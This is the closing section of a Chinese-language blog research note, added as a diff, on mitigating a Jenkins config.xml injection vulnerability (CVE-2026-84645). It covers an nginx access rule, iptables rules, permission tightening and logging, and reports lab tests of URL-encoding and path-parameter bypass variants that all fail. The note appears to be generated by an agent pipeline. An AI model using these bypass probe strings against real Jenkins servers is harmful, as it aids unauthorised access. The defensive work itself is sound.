+<p><strong>Phase 4 实测（nginx:1.26-alpine 反代 + limit_except，2026-09-04）</strong>：非白名单源 POST config.xml → <strong>403</strong>；绕过变体测试（路径参数 <code>config.xml%3bjsessionid=x</code>、双重编码 <code>carrier%252fconfig.xml</code>、大小写 <code>JOB/.../CONFIG.XML</code>、尾分号 <code>config.xml;</code>）全部<strong>未绕过</strong>（404/400）。注意：limit_except 的 allow 判定的是<strong>直连源 IP</strong>，反代架构下需用 real client IP（X-Forwarded-For + realip 模块）才能区分穿透多层代理的原始客户端。</p>
+<p><strong>边界说明</strong>：本缓解只阻断新注入，不清理已注入对象图——发现已被注入的实例需<strong>重启 Jenkins</strong>（transient 注入链重启后消失，持久注入链需同时检查 config.xml 是否被污染）。</p>
+</li>
+<li><p><strong>网络层收敛 Jenkins 管理面暴露</strong>（iptables，仅允许可信网段访问 8080）：</p>
+<pre><code class="language-bash">iptables -A INPUT -p tcp --dport 8080 -s 10.0.0.0/8 -j ACCEPT
+iptables -A INPUT -p tcp --dport 8080 -j DROP
+</code></pre>
+</li>
+<li><p><strong>收紧 Item/Configure 授权并审计异常 Script Console 访问</strong>：本攻击链要求攻击者可提交 job config.xml（Item/Configure）。在矩阵授权中仅向可信管理员授予；同时在 System Log 新建 recorder 记录 <code>jenkins.model.Jenkins</code> 与 <code>hudson.util.RobustReflectionConverter</code>（WARNING 级），2.580 的守卫日志与异常序列化行为（&quot;Refusing to unmarshal&quot;、writeReplace 异常）会在此暴露注入尝试。厂商未提供针对此漏洞的专用回退开关或系统属性（来源：官方公告无 mitigations 字段，公告对同批次其他漏洞给出的缓解不适用于本漏洞）。</p>
+<p><strong>Phase 4 实测</strong>：无 Item/Configure 权限的匿名会话 POST config.xml → <strong>403</strong>（对照组持权用户 → 200），权限收紧对该攻击面有效。</p>
+</li>
+</ol>
+<h2 id="section-参考链接-19">参考链接</h2>
+<table>
+<thead>
+<tr>
+<th>CVE</th>
+<th>Advisory URL</th>
+<th>Commit URL</th>
+<th>Download URL</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CVE-2026-84645</td>
+<td><a href="https://www.jenkins.io/security/advisory/2026-09-02/#SECURITY-3972">Jenkins SECURITY-3972 公告</a></td>
+<td><a href="https://github.com/jenkinsci/jenkins/commit/0d731367e08656f8cd1e8275f0e820f97af07fc6">jenkinsci/jenkins 0d73136 修复提交</a></td>
+<td><a href="https://get.jenkins.io/war/2.580/jenkins.war">jenkins.war 2.580（weekly）</a> · <a href="https://get.jenkins.io/war-stable/2.568.3/jenkins.war">jenkins.war 2.568.3（LTS）</a></td>
+</tr>
+</tbody></table>
+<p>辅助来源：</p>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-84645">NVD — CVE-2026-84645</a></li>
+<li><a href="https://github.com/advisories/GHSA-g5fg-fmcm-8xx6">GHSA-g5fg-fmcm-8xx6</a></li>
+<li><a href="https://www.jenkins.io/changelog/">Jenkins Changelog（2.580，2026-09-02）</a></li>
+</ul>
+<hr>
+<p><em>文档生成：pi agent · /hunt → /cve 流水线 · Phase 0-4（2026-09-04）· 实测靶场保留于 10.10.10.10（j579:8057 / j580:8058）</em></p>
+<footer class="article-end"><span>END OF RESEARCH NOTE</span><p>最后更新于 2026.09.06 · hongzh0's Blog</p></footer><nav class="article-nav" aria-label="文章导航"><a class="article-nav-prev" rel="prev" href="removed-post.html" aria-label="上一篇：[已移除的文章]"><span>上一篇</span><strong>[已移除的文章]</strong></a></nav></article></div></main>
+<footer class="site-footer"><div class="wrap footer-grid"><div><a class="brand footer-brand" href="../index.html"><img class="brand-avatar" src="/assets/avatar-72.webp" srcset="/assets/avatar-72.webp 72w, /assets/avatar-128.webp 128w" sizes="36px" alt="" width="36" height="36" decoding="async"><span>hongzh0's Blog</span></a><p>安全研究、Agent应用、工具开发。</p></div><div class="footer-links"><span>探索</span><a href="../archive.html">文章归档</a><a href="../links.html">友链</a><a href="../about.html">关于我</a><a href="../feed.xml">RSS 订阅</a></div><div class="footer-links"><span>连接</span><a href="https://github.com/hg0434hongzh0" target="_blank" rel="noreferrer">GitHub <span aria-hidden="true">↗</span></a></div><div class="footer-end"><span>© 2026 HONGZH0</span><span class="site-stats" aria-label="站点访问统计"><span>PV <strong id="busuanzi_site_pv">—</strong></span><span>UV <strong id="busuanzi_site_uv">—</strong></span></span><button type="button" class="back-top" aria-label="返回顶部"><span aria-hidden="true">↑</span></button></div></div></footer><script src="../assets/main.js?v=7540f2c171e5"></script></body></html>
